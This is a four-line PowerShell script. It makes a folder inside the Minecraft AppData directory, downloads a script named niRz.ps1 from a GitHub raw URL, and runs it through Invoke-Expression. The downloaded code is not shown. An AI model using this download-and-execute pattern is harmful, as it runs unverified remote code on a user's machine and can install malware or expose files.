$target_dir = "$env:APPDATA\.minecraft\niRz"
mkdir "$target_dir" -ErrorAction Ignore
Invoke-RestMethod "https://raw.githubusercontent.com/dualcoding/mc/main/niRz.ps1" -OutFile "$target_dir\niRz.ps1"
Invoke-Expression "$target_dir\niRz.ps1"